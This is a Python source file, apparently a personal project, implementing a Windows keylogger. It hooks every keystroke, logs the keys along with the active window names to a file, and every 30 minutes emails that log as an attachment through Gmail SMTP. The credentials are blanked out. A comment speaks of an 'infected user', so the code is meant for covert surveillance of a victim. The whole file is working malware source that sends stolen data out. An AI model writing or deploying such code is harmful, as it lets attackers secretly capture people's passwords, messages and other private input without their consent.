"""
Created on Sat Oct 26 17:02:44 2019
@author: Wilfredo Mendivil
"""

import pythoncom #used for pumpMessage()
import pyWinhook as pyhook #used for monitoring keystrokes
import threading #used for timer() function 
import os #used for monitoring windows events
import smtplib #used to connect to smtp server
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart

line_buffer= "" # make the linebuffer empty
file_log = 'testFile.txt' #file to where the keystrokes will be registed to
currentWindow ='' #set current window to empty

#method to save lines into a file when called
def saveLine(line):
    modFile = open(file_log, 'a')
    modFile.write(line)
    modFile.close()

#method to get the key strokes of a infected user and save them to a file
def KeyboardEvent(event):
    global line_buffer
    global currentWindow
    #checks to see if a new window is opened in order to save to a file
    if(currentWindow != event.WindowName): #if typing in new window
       line_buffer += '\n'
       saveLine(line_buffer) #print to file: any non printed characters from old window       
       line_buffer = "" #clear the line buffer
       line_buffer = '\n-----WindowName: ' + event.WindowName + ' -------------\n'
       saveLine(line_buffer) #print to file: the new window name
       line_buffer = ''
       currentWindow = event.WindowName #set the new window name

 #if tab key pressed
    if(event.Ascii == 9): #tab
        line_buffer += '    '
        saveLine(line_buffer) #print to file: the line buffer
        return True #exit event

 #if enter key pressed / return key add line to line buffer and safe to fie
 #13 and 10 are return/enter keys so need to monitor both
    if(event.Ascii == 13 or event.Ascii ==10): #enter
      line_buffer += '\n'#add empty line to line buffer
      saveLine(line_buffer) #print line to file
      line_buffer = "" #clear the line buffer
      return True 
  
    #if any other key but alphanumerical keys are pressed do nothing
    if (event.Ascii <31 or event.Ascii >127):
        pass
   #if backspace key pressed add a @ sign
    if(event.Ascii == 8): 
       line_buffer += '@' #adds @ to differentiate backspace from keystrokes
       return True 

    #if alphanumeric keys are presses=d
    if(event.Ascii > 31 or event.Ascii < 127):
        line_buffer += chr(event.Ascii) #add pressed character to line buffer  
        return True
        
def sendLog():
    outer = MIMEMultipart()
    # Add attachment to email
    with open(file_log, 'rb') as fp:
        msg = MIMEBase('application', "octet-stream")
        msg.set_payload(fp.read())
    encoders.encode_base64(msg)
    msg.add_header('Content-Disposition', 'attachment', filename=os.path.basename(file_log))
    outer.attach(msg)
    composed = outer.as_string()
    # creates SMTP session 
    server = smtplib.SMTP('smtp.gmail.com', 587)
    # start TLS for security 
    server.starttls() 
    # Authentication 
    server.login("----------------------", "--------------") 
    # sending the mail 
    server.sendmail("--------------", "--------------------", composed) 

    #terminating the session 
    server.quit()

    print("Message sent")
    open(file_log, "w").close()  

#checks if to send a file or not
# run this method every 30 minutes
def fileCheck():
    threading.Timer(1800.0, fileCheck).start()#check for 30 minute increments of time
    #read file and save length
    f = open(file_log, "r")
    length = len(f.read())
    f.close()#close file
    if length != 0:#check if anythings been written to file
        #send log through email
        sendLog()

fileCheck()
hooks_manager = pyhook.HookManager()
hooks_manager.KeyDown = KeyboardEvent
hooks_manager.HookKeyboard() 
pythoncom.PumpMessages() #keeps a loop going until a quit signal is placed
